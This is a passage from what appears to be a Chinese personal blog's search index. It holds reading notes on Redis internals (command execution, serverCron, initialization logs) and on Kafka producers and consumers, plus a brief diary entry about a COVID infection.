KILL命令，其他命令都会被服务器拒绝。\n如果客户端正在执行事务，那么服务器只会执行客户端发来的EXEC、DISCARD、MULTI、WATCH四个命令，其他命令都会被放进事务队列中。\n如果服务器打开了监视器功能，那么服务器会将要执行的命令和参数等信息发送给监视器。当完成了以上预备操作之后，服务器就可以开始真正执行命令了。\n\n\n命令执行器（3）：调用命令的实现函数服务器已经将要执行命令的实现保存到了客户端状态的cmd属性里面，并将命令的参数和参数个数分别保存到了客户端状态的argv属性和argv属性里面，当服务器决定要执行命令时，只需要调用cmd指针的proc(client)函数即可。因为执行命令所需的实际参数都已经保存到客户端状态的argv属性里面了，所以命令的实现函数只需要一个指向客户端状态的指针作为参数即可。被调用的命令实现函数会执行指定的操作，并产生相应的命令回复，这些回复会被保存在客户端状态的输出缓冲区里面（buf属性和reply属性），之后实现函数还会为客户端的套接字关联命令回复处理器，这个处理器负责将命令回复返回给客户端。对于前面SET命令的例子来说，函数调用setCommand（client）将产生一个”+OK\\r\\n”回复，这个回复会被保存到客户端状态的buf属性里面。\n命令执行器（4）：执行后续工作在执行完实现函数之后，服务器还需要执行一些后续工作：\n如果服务器开启了慢查询日志功能，那么慢查询日志模块会检查是否需要为刚刚执行完的命令请求添加一条新的慢查询日志。\n根据刚刚执行命令所耗费的时长，更新被执行命令的redisCommand结构的milliseconds属性，并将命令的redisCommand结构的calls计数器的值增一。\n如果服务器开启了AOF持久化功能，那么AOF持久化模块会将刚刚执行的命令请求写入到AOF缓冲区里面。\n如果有其他从服务器正在复制当前这个服务器，那么服务器会将刚刚执行的命令传播给所有从服务器。\n\n\n\n\n\n\n将命令回复发送给客户端。命令实现函数会将命令回复保存到客户端的输出缓冲区里面，并为客户端的套接字关联命令回复处理器，当客户端套接字变为可写状态时，服务器就会执行命令回复处理器，将保存在客户端输出缓冲区中的命令回复发送给客户端。\n客户端接收并打印命令回复。当客户端接收到协议格式的命令回复之后，它会将这些回复转换成人类可读的格式，并打印给用户观看（假设我们使用的是Redis自带的redis-cli客户端。\n\nserverCron函数Redis服务器中的serverCron函数默认每隔100毫秒执行一次，这个函数负责管理服务器的资源，并保持服务器自身的良好运转。\nserverCron 是 Redis 的核心函数之一，它负责定期执行一系列后台任务来确保 Redis 服务器的正常运行。这个函数通常每 100 毫秒执行一次，由 Redis 的事件处理机制触发。它在 Redis 的主事件循环中扮演着关键角色。serverCron 函数的设计目标是将服务器的维护任务和客户请求的处理分开，并通过定时任务来管理服务器的内部状态。\na) 客户端超时管理 (clientTimeout)\n\nRedis 会检查每个客户端的空闲时间 (idle)，如果客户端空闲超过指定的超时时间（通常是 0 表示不限制），则关闭这些连接，释放资源。这可以防止大量的空闲连接消耗内存和资源。\n例如，Redis 会定期扫描所有客户端，关闭超时的连接。客户端的状态被记录在 client 结构体中，包括它的活动时间等。\n\nb) 过期键处理\n\nRedis 通过扫描数据库中的键来检查和删除过期的键。serverCron 会定期触发过期键的清理操作，尤其是检查那些通过 EXPIRE 设置了过期时间的键。\nRedis 采用两种过期处理方式：\n惰性删除：每次访问键时检查是否过期，如果过期则删除。\n定期删除：定期触发 serverCron 扫描所有数据库，删除过期的键。\n\n\n\nc) 主从复制管理\n\nserverCron 还会管理主从复制的相关操作，如检查主服务器与从服务器的状态、处理复制偏移量等。若发生故障，它也会发起故障切换操作。\n在哨兵模式下，它还负责与哨兵协调，检查主节点是否宕机，是否需要执行故障转移。\n\nd) 内存管理\n\nRedis 允许配置内存限制，当 Redis 使用的内存超过限制时，它会尝试执行内存回收操作。serverCron 会定期触发内存逐出操作（如 LRU，LFU 策略）。\n它会定期检查当前的内存使用情况，并触发后台的内存清理过程，按照配置的逐出策略删除不再需要的键。\n\ne) AOF 和 RDB 持久化\n\nserverCron 还负责触发 AOF 文件的同步、AOF 重写（如果开启了 appendonly 配置）和 RDB 快照保存（如果开启了 save 配置）。\n在每次 serverCron 执行时，它会检查是否需要进行 AOF 和 RDB 的操作。例如，如果上次 AOF 重写时间间隔太长，或是内存达到一定阈值时，可能会触发 AOF 文件的重写操作。\n\nf) 集群维护\n\n在 Redis 集群模式下，serverCron 会定期检查集群节点的状态。它会周期性地向集群中的其他节点发送心跳检测请求，确保节点间的连接是活跃的。\n在集群环境下，serverCron 也负责检查各节点的分片数据，处理分片重分配等操作。\n\ng) 统计信息更新\n\n每次执行 serverCron 时，Redis 会更新一些运行时的统计信息，如内存使用情况、命令执行次数、客户端数量等。这些信息对运维监控和性能分析非常重要。\n\nh) Lua 脚本处理\n\nRedis 支持 Lua 脚本，serverCron 会检查当前正在执行的 Lua 脚本。如果脚本执行超时，它会中断脚本执行，并返回错误。\n\n初始化服务器一个Redis服务器从启动到能够接受客户端的命令请求，需要经过一系列的初始化和设置过程，比如初始化服务器状态，接受用户指定的服务器配置，创建相应的数据结构和网络连接等等。\n初始化服务器状态结构初始化服务器的第一步就是创建一个struct redisServer类型的实例变量server作为服务器的状态，并为结构中的各个属性设置默认值。初始化server变量的工作由redis.c&#x2F;initServerConfig函数完成\n以下是initServerConfig函数完成的主要工作：\n\n设置服务器的运行ID。\n设置服务器的默认运行频率。\n设置服务器的默认配置文件路径。\n设置服务器的运行架构。\n设置服务器的默认端口号。\n设置服务器的默认RDB持久化条件和AOF持久化条件。\n初始化服务器的LRU时钟。\n创建命令表。\n\n载入配置选项在启动服务器时，用户可以通过给定配置参数或者指定配置文件来修改服务器的默认配置。\n\n如果用户为这些属性的相应选项指定了新的值，那么服务器就使用用户指定的值来更新相应的属性。\n如果用户没有为属性的相应选项设置新的值，那么服务器就沿用之前initServerConfig函数为属性设置的默认值。\n\n初始化服务器数据结构在之前执行initServerConfig函数初始化server状态时，程序只创建了命令表一个数据结构，不过除了命令表之外，服务器状态还包含其他数据结构，比如：\n\nserver.clients链表，这个链表记录了所有与服务器相连的客户端的状态结构，链表的每个节点都包含了一个redisClient结构实例。\nserver.db数组，数组中包含了服务器的所有数据库。\n用于保存频道订阅信息的server.pubsub_channels字典，以及用于保存模式订阅信息的server.pubsub_patterns链表。\n用于执行Lua脚本的Lua环境server.lua。\n用于保存慢查询日志的server.slowlog属性。\n\n当初始化服务器进行到这一步，服务器将调用initServer函数，为以上提到的数据结构分配内存，并在有需要时，为这些数据结构设置或者关联初始化值。服务器到现在才初始化数据结构的原因在于，服务器必须先载入用户指定的配置选项，然后才能正确地对数据结构进行初始化。如果在执行initServerConfig函数时就对数据结构进行初始化，那么一旦用户通过配置选项修改了和数据结构有关的服务器状态属性，服务器就要重新调整和修改已创建的数据结构。为了避免出现这种麻烦的情况，服务器选择了将server状态的初始化分为两步进行，initServerConfig函数主要负责初始化一般属性，而initServer函数主要负责初始化数据结构。\n除了初始化数据结构之外，initServer还进行了一些非常重要的设置操作，其中包括：\n\n为服务器设置进程信号处理器。\n创建共享对象：这些对象包含Redis服务器经常用到的一些值，比如包含”OK”回复的字符串对象，包含”ERR”回复的字符串对象，包含整数1到10000的字符串对象等等，服务器通过重用这些共享对象来避免反复创建相同的对象。\n打开服务器的监听端口，并为监听套接字关联连接应答事件处理器，等待服务器正式运行时接受客户端的连接。\n为serverCron函数创建时间事件，等待服务器正式运行时执行serverCron函数。\n如果AOF持久化功能已经打开，那么打开现有的AOF文件，如果AOF文件不存在，那么创建并打开一个新的AOF文件，为AOF写入做好准备。\n初始化服务器的后台I&#x2F;O模块（bio），为将来的I&#x2F;O操作做好准备。\n\n当initServer函数执行完毕之后，服务器将用ASCII字符在日志中打印出Redis的图标，以及Redis的版本号信息。\n2024-11-13T01:58:13.881201049Z                 _._                                                  2024-11-13T01:58:13.881203185Z            _.-``__ &#x27;&#x27;-._                                             2024-11-13T01:58:13.881204638Z       _.-``    `.  `_.  &#x27;&#x27;-._           Redis Community Edition      2024-11-13T01:58:13.881205864Z   .-`` .-```.  ```\\/    _.,_ &#x27;&#x27;-._     7.4.1 (00000000/0) 64 bit2024-11-13T01:58:13.881207186Z  (    &#x27;      ,       .-`  | `,    )     Running in standalone mode2024-11-13T01:58:13.881208407Z  |`-._`-...-` __...-.``-._|&#x27;` _.-&#x27;|     Port: 63792024-11-13T01:58:13.881209585Z  |    `-._   `._    /     _.-&#x27;    |     PID: 12024-11-13T01:58:13.881210759Z   `-._    `-._  `-./  _.-&#x27;    _.-&#x27;                                   2024-11-13T01:58:13.881211947Z  |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|                                  2024-11-13T01:58:13.881213124Z  |    `-._`-._        _.-&#x27;_.-&#x27;    |           https://redis.io       2024-11-13T01:58:13.881214326Z   `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;                                   2024-11-13T01:58:13.881215484Z  |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|                                  2024-11-13T01:58:13.881216637Z  |    `-._`-._        _.-&#x27;_.-&#x27;    |                                  2024-11-13T01:58:13.881217812Z   `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;                                   2024-11-13T01:58:13.881218989Z       `-._    `-.__.-&#x27;    _.-&#x27;                                       2024-11-13T01:58:13.881220151Z           `-._        _.-&#x27;                                           2024-11-13T01:58:13.881221346Z               `-.__.-&#x27;                                               2024-11-13T01:58:13.881222564Z 2024-11-13T01:58:13.883108976Z 1:M 13 Nov 2024 01:58:13.883 * Server initialized\n\n还原数据库状态在完成了对服务器状态server变量的初始化之后，服务器需要载入RDB文件或者AOF文件，并根据文件记录的内容来还原服务器的数据库状态。根据服务器是否启用了AOF持久化功能，服务器载入数据时所使用的目标文件会有所不同：\n\n如果服务器启用了AOF持久化功能，那么服务器使用AOF文件来还原数据库状态。\n相反地，如果服务器没有启用AOF持久化功能，那么服务器使用RDB文件来还原数据库状态。\n\n当服务器完成数据库状态还原工作之后，服务器将在日志中打印出载入文件并还原数据库状态所耗费的时长。\n2024-11-13T01:58:13.883532676Z 1:M 13 Nov 2024 01:58:13.883 * Loading RDB produced by version 7.4.12024-11-13T01:58:13.883543863Z 1:M 13 Nov 2024 01:58:13.883 * RDB age 169350 seconds2024-11-13T01:58:13.883545635Z 1:M 13 Nov 2024 01:58:13.883 * RDB memory usage when created 1.16 Mb2024-11-13T01:58:13.883549523Z 1:M 13 Nov 2024 01:58:13.883 * Done loading RDB, keys loaded: 1, keys expired: 0.2024-11-13T01:58:13.883742175Z 1:M 13 Nov 2024 01:58:13.883 * DB loaded from disk: 0.000 seconds\n\n执行事件循环在初始化的最后一步，服务器将打印出以下日志：\n2024-11-13T01:58:13.883757032Z 1:M 13 Nov 2024 01:58:13.883 * Ready to accept connections tcp\n\n并开始执行服务器的事件循环（loop）。至此，服务器的初始化工作圆满完成，服务器现在开始可以接受客户端的连接请求，并处理客户端发来的命令请求了。\nEnd至此，这本书已经读完一半了。剩下还有两部分，多机数据库的实现（第十五至十七章）和独立功能的实现（第十八至第二十四章）。由于这本书是16年出版的，所使用的redis版本为2.9 ，而我测试使用的redis版本为7.4经过近十年的更新，书中很多api和参数可能已经变化或弃用。不过整体架构肯定是一脉相承的。所以这本书的阅读就到这里了。\n最后，技术相关书籍的阅读学习还是要找近两三年出版的比较好。特别是关于实现方面，涉及大量需要实际搭环境验证的场景，过时的内容非常影响阅读。另外，非常推荐阅读官方文档，Redis官方文档还是挺详细的，还有AI式的搜索。但是关于设计方面，思想不会过时，架构则是根据实际需要去设计调整。那么这本书还是值得一看的。\n","categories":["读书笔记"],"tags":["Redis","数据库","《Redis设计与实现》"]},{"title":"阳了","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E9%98%B3%E4%BA%86/","content":"如标题一样言简意赅，没错，我阳了。从 2019-2022 新冠肆虐的三年我都没有阳，甚至还因为疫情在 2020 年高考延期了一个月。却在这个时候阳了。很难受。\n5月19号晚上睡觉的时候，就感觉眼睛很疼，我以为是疲劳用眼。就这么睡觉了然后半夜开始出汗。我现在估计那个时候就已经在发烧了。早上醒来的时候，我的脑袋很疼，昏昏沉沉。眼睛也很痛，眼球后面很痛。然后流着鼻涕咳着嗽，躺了一会起床了。\n去医务室看了一下。体温 38度 。难怪头那么疼，给开了盒氨麻美敏胶囊（每次2-4粒，每六小时一次），有医保，-2.9回宿舍之后，店长璐姐给送了两盒药（磷酸奥司他韦颗粒，清宣止咳颗粒）和一盒牛奶。太感谢了\n下午吃完药，睡了一下午。一整天的胃口都不怎么好。醒来的时候烧退了，人也稍微清醒了点。\n东苑食堂二楼，放了一天的《体面》，在这些《体面》里，还有一首《分手快乐》\n\n\n","categories":["记录生活"],"tags":["日记","新冠","病"]},{"title":"《apache Kafka实战》读书笔记-producer、consumer和设计原理","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Aapache%20Kafka%E5%AE%9E%E6%88%98%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-producer%E3%80%81consumer%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/","content":"springboot 开发参考 Spring for Apache Kafka\\Introduction\\Quick Tour\n第四章 - producer开发producer概览Kafka producer 是负责向 Kafka 写入数据的应用程序。\nKafka producer在设计上要比consumer简单一些，因为它不涉及复杂的组管理操作，即每个producer都是独立进行工作的，与其他producer实例之间没有关联，因此它受到的牵绊自然也要少得多，实现起来也要简单得多。producer的首要功能就是向某个 topic的某个分区发送一条消息，所以它首先需要确认到底要向 topic 的哪个分区写入消息——这就是分区器（partitioner）要做的事情。Kafka producer 提供了一个默认的分区器。对于每条待发送的消息而言，如果该消息指定了 key，那么该 partitioner 会根据 key的哈希值来选择目标分区；若这条消息没有指定 key，则 partitioner 使用轮询的方式确认目标分区——这样可以最大限度地确保消息在所有分区上的均匀性。当然producer的API赋予了用户自行指定目标分区的权力，即用户可以在消息发送时跳过partitioner直接指定要发送到的分区。另外，producer 也允许用户实现自定义的分区策略而非使用默认的 partitioner，这样用户可以很灵活地根据自身的业务需求确定不同的分区策略。\n通过 partitioner，我们就可以确信具有相同 key的所有消息都会被路由到相同的分区中。这有助于实现一些特定的业务需求，比如可以利用局部性原理，将某些producer发送的消息固定地发送到相同机架上的分区从而减少网络传输的开销等。如果没有指定key，那么所有消息会被均匀地发送到所有分区，而这通常也是最合理的分区策略。\n确认了目标分区后，producer 要做的第二件事情就是要寻找这个分区对应的 leader，也就是该分区leader副本所在的Kafka broker。每个topic分区都由若干个副本组成，其中的一个副本充当leader的角色，也只有leader才能够响应clients发送过来的请求，而剩下的副本中有一部分副本会与 leader副本保持同步，即所谓的 ISR。因此在发送消息时，producer 也就有了多种选择来实现消息发送。比如不等待任何副本的响应便返回成功，或者只是等待 leader副本响应写入操作之后再返回成功等。\n在java中，producer首先使用一个线程（用户主线程，也就是用户启动 producer的线程）将待发送的消息封装进一个 ProducerRecord 类实例。然后将其序列化之后发送给 partitioner，再由后者确定了目标分区后一同发送到位于 producer程序中的一块内存缓冲区中。而 producer的另一个工作线程（I&#x2F;O发送线程，也称 Sender线程）则负责实时地从该缓冲区中提取出准备就绪的消息封装进一个批次（batch），统一发送给对应的broker。\n\n消息分区机制随 Kafka 发布的默认partitioner会尽力确保具有相同key的所有消息都会被发送到相同的分区上；若没有为消息指定 key，则该 partitioner会选择轮询的方式来确保消息在 topic的所有分区上均匀分配。自定义分区策略实现org.apache.kafka.clients.producer.Partitioner接口即可：\n\nint partition(String topic, Object key, byte[] keyBytes, Object value, byte[] valueBytes, Cluster cluster) 计算消息的目标分区。\ntopic: 主题名称。\nkey/value: 消息的键值（可能为 null）。\nkeyBytes/valueBytes: 序列化后的键值字节数组。\ncluster: 当前集群元数据（如可用分区信息）。\n\n\nvoid close() 区器时释放资源（如网络连接或线程池）。\nvoid configure(Map&lt;String, ?&gt; configs) 分区器时调用，传递生产者的配置参数（如 partitioner.class 中配置的自定义参数）。\n\n消息序列化在网络中发送数据都是以字节的方式。序列化器（serializer）负责在 producer 发送前将消息转换成字节数组；而与之相反，解序列化器（deserializer）则用于将 consumer 接收到的字节数组转换成相应的对象。\nKafka 支持用户自定义消息序列化。若要编写一个自定义的 serializer，需要实现 org.apache.kafka.common.serialization.Serializer 接口：\n\nvoid configure(Map&lt;String, ?&gt; configs, boolean isKey) 初始化序列化器，读取生产者&#x2F;消费者的配置参数（如编码格式、压缩类型等）。\nconfigs: Kafka 配置（如 ProducerConfig 或 ConsumerConfig 中的键值对）。\nisKey: 标记当前序列化的是键（Key）还是值（Value）。\n\n\nbyte[] serialize(String topic, T data) 将对象 data 序列化为字节数组。\ntopic: 目标主题名称（某些序列化器可能依赖主题元数据）。\ndata: 待序列化的对象（可能是 null）。\n\n\nvoid close() 关闭序列化器时释放资源（如文件句柄、网络连接等）。\n\n拦截器对于 producer而言，interceptor使得用户在消息发送前以及 producer回调逻辑前有机会对消息做一些定制化需求，比如修改消息等。同时，producer 允许用户指定多个 interceptor 按序作用于同一条消息从而形成一个拦截链（interceptor chain）。interceptor 的实现接口是org.apache.kafka.clients.producer.ProducerInterceptor\n无消息丢失配置Java 版本 producer 用户采用异步发送机制。KafkaProducer.send 方法仅仅把消息放入缓冲区中，由一个专属 I&#x2F;O 线程负责从缓冲区中提取消息并封装进消息 batch中，然后发送出去。显然，这个过程中存在着数据丢失的窗口：若 I&#x2F;O线程发送之前 producer崩溃，则存储缓冲区中的消息全部丢失了。这是producer需要处理的很重要的问题。\nproducer 的另一个问题就是消息的乱序。如果发送两条消息 record1 和 record2。由于某些原因（比如瞬时的网络抖动）导致 record1未发送成功，同时 Kafka 又配置了重试机制以及max.in.flight.requests.per.connection大于1（默认值是5）。那么producer重试 record1成功后，record1在日志中的位置反而位于 record2之后，这样造成了消息的乱序。\n很容易想到的一个方案就是：既然异步发送可能丢失数据，改成同步发送似乎是一个不错的主意。但是性能会很差，并不推荐在实际场景中使用。因此最好能有一份配置，既使用异步方式还能有效地避免数据丢失，即使出现producer崩溃的情况也不会有问题。\n生产者（Producer）配置\nblock.on.buffer.full = true（已过时）\n替代参数：max.block.ms（Kafka 0.9+ 后使用）\n作用：当生产者缓冲区（内存）满时，阻塞生产者线程（而非丢弃消息），直到缓冲区有空间或超时。\n配置原因：防止因生产者发送速度过快导致缓冲区溢出，从而丢失消息。\n注意：在高版本 Kafka 中，此参数已被 max.block.ms 替代，需设置为一个较大的值（如 max.block.ms=60000）。\n\n\nacks = all 或 acks = -1\n作用：要求所有 ISR（In-Sync Replicas，同步副本）确认消息写入后，生产者才认为发送成功。\n配置原因：确保消息至少被写入 Leader 和所有 ISR 副本的磁盘，避免 Leader 副本宕机后消息丢失。\n\n\nretries = Integer.MAX_VALUE\n作用：设置生产者无限重试发送失败的消息。\n配置原因：应对网络抖动、Broker 临时不可用等场景，确保消息最终成功写入。\n注意：需结合 delivery.timeout.ms（默认 120 秒）控制总重试时间，避免无限阻塞。\n\n\nmax.in.flight.requests.per.connection = 1\n作用：限制单个连接上未确认的请求数最多为 1。\n配置原因：防止因网络问题导致消息乱序重试时覆盖先前未确认的消息（如启用重试可能导致消息顺序错乱）。\n权衡：降低吞吐量，但保证消息顺序性和可靠性。\n\n\n使用带回调的 send() 方法：KafkaProducer.send(record, callback)\n作用：通过回调函数处理发送结果（成功或失败）。\n配置原因：\n可捕获发送异常（如网络错误、序列化失败）。\n在回调中执行重试或日志记录，确保消息不丢失。\n\n\n\n\nCallback 逻辑中显式关闭 Producer：close(0)\n作用：在发生不可恢复错误时，立即关闭生产者。\n配置原因：\n避免继续发送可能失败的消息，防止数据丢失（如 Broker 永久不可用）。\nclose(0) 表示立即关闭，不等待未完成请求。\n\n\n注意：需谨慎使用，仅在极端场景下关闭生产者（如关键业务不允许任何丢失）。\n\n\n\nBroker 配置\nunclean.leader.election.enable = false\n作用：禁止非 ISR 副本（不同步的副本）参与 Leader 选举。\n配置原因：\n若允许非 ISR 副本成为 Leader，可能丢失已提交但未同步到该副本的消息。\n确保只有同步副本成为 Leader，避免数据丢失。\n\n\n\n\nreplication.factor &gt;= 3\n作用：每个分区的副本数设置为大于 3。\n配置原因：\n提供高冗余，即使多个 Broker 宕机，分区仍可用。\n结合 min.insync.replicas 确保写入足够副本。\n\n\n\n\n\n\nmin.insync.replicas &gt; 1\n作用：定义消息写入至少 2 个副本（包括 Leader）后才视为“已提交”。\n配置原因：\n若写入副本数不足，生产者会收到 NotEnoughReplicasException，触发重试。\n防止仅写入 Leader 后 Leader 宕机导致消息丢失。\n只有在 producer 端 acks 被设置成all或-1时，这个参数才有意义。\n\n\n\n\nreplication.factor &gt; min.insync.replicas\n配置原因：\n确保在部分副本不可用时（如维护、故障），仍有足够 ISR 副本满足 min.insync.replicas。\n例如：replication.factor=3 且 min.insync.replicas=2，允许 1 个副本离线不影响写入。\n\n\n\n\n\n消费者（Consumer）配置\nenable.auto.commit = false\n作用：关闭消费者自动提交偏移量（offset）。\n配置原因：\n自动提交可能导致消息未处理完成但偏移量已提交，若消费者崩溃，消息会丢失。\n需手动调用 commitSync() 或 commitAsync()，确保消息处理完成后再提交偏移量。\n\n\n\n\n\n消息压缩数据压缩显著地降低了磁盘占用或带宽占用，从而有效地提升了 I&#x2F;O密集型应用的性能。不过引入压缩同时会消耗额外的 CPU时钟周期，因此压缩是 I&#x2F;O性能和 CPU资源的平衡（trade-off）。\nKafka 压缩特性就是——producer 端压缩，broker 端保持，consumer 端解压缩。所谓的 broker 端保持是指 broker 端在通常情况下不会进行解压缩操作，它只是原样保存消息而已。这里的“通常情况下”表示要满足一定的条件。如果有些前置条件不满足（比如需要进行消息格式的转换等），那么broker端就需要对消息进行解压缩然后再重新压缩。\n如何调优 producer的压缩性能。\n首先判断是否启用压缩的依据是 I&#x2F;O资源消耗与CPU资源消耗的对比。如果生产环境中的I&#x2F;O资源非常紧张，比如producer程序消耗了大量的网络带宽或 broker端的磁盘占用率非常高，而 producer端的 CPU资源非常富裕，那么就可以考虑为producer开启消息压缩。反之则不需要设置消息压缩以节省宝贵的CPU时钟周期。其次，压缩的性能与 producer 端的 batch 大小息息相关。通常情况下我们可以认为 batch越大需要压缩的时间就越长。batch大小越大，压缩时间就越长，不过时间的增长不是线性的，而是越来越平缓的。如果发现压缩很慢，说明系统的瓶颈在用户主线程而不是 I&#x2F;O发送线程，因此可以考虑增加多个用户线程同时发送消息，这样通常能显著地提升producer吞吐量。\n第五章 - consumer开发consumer概览Kafka消费者（consumer）是从Kafka读取数据的应用。若干个 consumer订阅Kafka集群中的若干个 topic并从 Kafka接收属于这些 topic的消息。\n消费者组：\n\nConsumers label themselves with a consumer group name,and each record published to a topic is delivered to one consumer instance within each subscribing consumer group.消费者使用一个消费者组名（即 group.id）来标记自己，topic 的每条消息都只会被发送到每个订阅它的消费者组的一个消费者实例上。\n\n\n一个 consumer group 可能有若干个 consumer实例（一个 group 只有一个实例也是允许的）。\n对于同一个 group 而言，topic 的每条消息只能被发送到 group 下的一个 consumer 实例上。\ntopic 消息可以被发送到多个group中。\n\n前面说过 Kafka 同时支持基于队列和基于发布&#x2F;订阅的两种消息引擎模型。事实上 Kafka 就是通过 consumer group 实现的对这两种模型的支持。\n\n所有 consumer 实例都属于相同 group —— 实现基于队列的模型。每条消息只会被一个consumer实例处理。\nconsumer 实例都属于不同 group —— 实现基于发布&#x2F;订阅的模型。极端的情况是每个consumer 实例都设置完全不同的 group，这样 Kafka 消息就会被广播到所有 consumer实例上。\n\nconsumer group是用于实现高伸缩性、高容错性的consumer机制。组内多个 consumer实例可以同时读取 Kafka消息，而且一旦有某个 consumer“挂”了，consumer group会立即将已崩溃 consumer负责的分区转交给其他 consumer来负责。从而保证整个 group 可以继续工作，不会丢失数据——这个过程被称为重平衡（rebalance）。\n位移（offset）这里 offset 指代的是 consumer端的 offset，与分区日志中的 offset是不同的含义。每个 consumer 实例都会为它消费的分区维护属于自己的位置信息来记录当前消费了多少条消息。被称为 位移（offset）。很多消息引擎都把消费端的 offset 保存在服务器端（broker）。这样做的好处当然是实现简单，但会有以下3个方面的问题。\n\nbroker从此变成了有状态的，增加了同步成本，影响伸缩性。\n需要引入应答机制（acknowledgement）来确认消费成功。\n由于要保存许多 consumer 的 offset，故必然引入复杂的数据结构，从而造成不必要的资源浪费。\n\nKafka 选择让 consumer group保存 offset，只需要简单地保存一个长整型数据。同时 Kafka consumer 还引入了检查点机制（checkpointing）定期对offset进行持久化，从而简化了应答机制的实现。\nconsumer客户端需要定期地向Kafka集群汇报自己消费数据的进度，这一过程被称为位移提交（offset commit）。位移提交这件事情对于 consumer 而言非常重要，它不仅表征了consumer 端的消费进度，同时也直接决定了 consumer 端的消费语义保证。\nKafka consumer 最开始会将位移提交到 Zookeeper，但这种方式并不好，ZooKeeper本质上只是一个协调服务组件，它并不适合作为位移信息的存储组件，毕竟频繁高并发的读&#x2F;写操作并不是 ZooKeeper擅长的事情。所以在新版本中consumer把位移提交到 Kafka 的一个内部 topic（__consumer_offsets）上。该topic是一个内部topic，通常不能直接操作该topic。\n消费者组重平衡（consumer group rebalance）本质上是一种协议，规定了一个 consumer group下所有 consumer如何达成一致来分配订阅 topic的所有分区。假设我们有一个 consumer group，它有20个 consumer实例。该 group订阅了一个具有100个分区的 topic。那么正常情况下，consumer group平均会为每个 consumer分配5个分区，即每个 consumer负责读取5个分区的数据。这个分配过程就被称作rebalance。\n消息轮询Kafka的 consumer是用来读取消息的，而且要能够同时读取多个 topic的多个分区的消息。若要实现并行的消息读取，一种方法是使用多线程的方式，为每个要读取的分区都创建一个专有的线程去消费；另一种方法是采用类似于 Linux I&#x2F;O模型的 poll或 select等，使用一个线程来同时管理多个 Socket 连接，即同时与多个 broker 通信实现消息的并行读取。\n一旦 consumer 订阅了 topic，所有的消费逻辑包括 coordinator 的协调、消费者组的rebalance以及数据的获取都会在主逻辑poll方法的一次调用中被执行。这样用户很容易使用一个线程来管理所有的consumer I&#x2F;O操作。\nconsumer 订阅 topic 之后通常以事件循环的方式来获取订阅方案并开启消息读取。仅仅是写一个循环，然后重复性地调用poll方法。剩下所有的工作都交给poll方法完成。每次poll方法返回的都是订阅分区上的一组消息。当然如果某些分区没有准备好，某次 poll 返回的就是空的消息集合。poll方法根据当前consumer的消费位移返回消息集合。当poll首次被调用时，新的消费者组会被创建并根据对应的位移重设策略（auto.offset.reset）来设定消费者组的位移。一旦consumer 开始提交位移，每个后续的 rebalance 完成后都会将位置设置为上次已提交的位移。传递给 poll 方法的超时设定参数用于控制 consumer 等待消息的最大阻塞时间。由于某些原因，broker端有时候无法立即满足consumer端的获取请求（比如consumer要求至少一次获取1MB的数据，但 broker 端无法立即全部给出），那么此时 consumer 端将会阻塞以等待数据不断累积并最终满足 consumer需求。如果用户不想让 consumer一直处于阻塞状态，则需要给定一个超时时间。因此poll方法返回满足以下任意一个条件即可返回。\n\n要么获取了足够多的可用数据。\n要么等待时间超过了指定的超时设置。\n\n位移管理offset 对于 consumer 非常重要，因为它是实现消息交付语义保证（message delivery semantic） 的基石。常见的3种消息交付语义保证如下。\n\n最多一次（at most once）处理语义：消息可能丢失，但不会被重复处理。\n最少一次（at least once）处理语义：消息不会丢失，但可能被处理多次。\n精确一次（exactly once）处理语义：消息一定会被处理且只会被处理一次。\n\n若consumer在消息消费之前就提交位移，那么便可以实现 at most once——因为若consumer 在提交位移与消息消费之间崩溃，则 consumer 重启后会从新的 offset 位置开始消费，前面的那条消息就丢失了。若提交位移在消息消费之后，则可实现 at least once 语义。\n除了offset，还有其他位置信息：\n\n上次提交位移（last committed offset）:consumer最近一次提交的offset值。\n当前位置（current position）:consumer已读取但尚未提交时的位置。\n水位（watermark）：也被称为高水位（high watermark），严格来说它不属于consumer 管理的范围，而是属于分区日志的概念。对于处于水位之下的所有消息，consumer 都是可以读取的，consumer 无法读取水位以上的消息。\n日志终端位移（Log End Offset,LEO）：也被称为日志最新位移。同样不属于consumer 范畴，而是属于分区日志管辖。它表示了某个分区副本当前保存消息对应的最大的位移值。值得注意的是，正常情况下 LEO不会比水位值小。事实上，只有分区所有副本都保存了某条消息，该分区的leader副本才会向上移动水位值。\n\nconsumer最多只能读取到水位值标记的消息，而不能读取尚未完全被“写入成功”的消息，即位于水位值之上的消息。\nconsumer 会在 Kafka 集群的所有 broker 中选择一个 broker 作为 consumer group 的coordinator，用于实现组成员管理、消费分配方案制定以及提交位移等。当消费者组首次启动时，由于没有初始的位移信息，coordinator 必须为其确定初始位移值，这就是 consumer 参数 auto.offset.reset的作用。通常情况下，consumer 要么从最早的位移开始读取，要么从最新的位移开始读取。\n当 consumer运行了一段时间之后，它必须要提交自己的位移值。如果 consumer崩溃或被关闭，它负责的分区就会被分配给其他 consumer，因此一定要在其他 consumer 读取这些分区前就做好位移提交工作，否则会出现消息的重复消费。\nconsumer 提交位移的主要机制是通过向所属的 coordinator 发送位移提交请求来实现的。每个位移提交请求都会往 __consumer_offsets 对应分区上追加写入一条消息。消息的 key 是group.id、topic和分区的元组，而 value就是位移值。如果 consumer为同一个 group的同一个topic 分区提交了多次位移，那么 __consumer_offsets 对应的分区上就会有若干条 key 相同但value 